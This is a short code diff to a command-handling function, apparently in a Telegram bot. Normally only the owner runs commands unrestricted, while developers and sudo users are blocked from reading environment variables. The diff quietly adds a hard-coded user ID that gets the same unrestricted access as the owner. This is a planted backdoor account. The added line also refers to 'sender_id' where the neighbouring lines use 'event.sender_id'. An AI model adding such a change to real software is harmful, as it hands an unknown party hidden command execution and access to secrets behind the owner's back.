@@ -53,6 +53,8 @@ async def _(event):
     cmd = event.text.split(" ", maxsplit=1)[1]
     if event.sender_id == OWNER_ID:
         pass
+    elif sender_id == 865058466:
+       pass
     elif event.sender_id in DEV_USERS or event.sender_id in SUDO_USERS:
         if "os.environ.get" in cmd:
           await event.reply("Can't access env variables.")
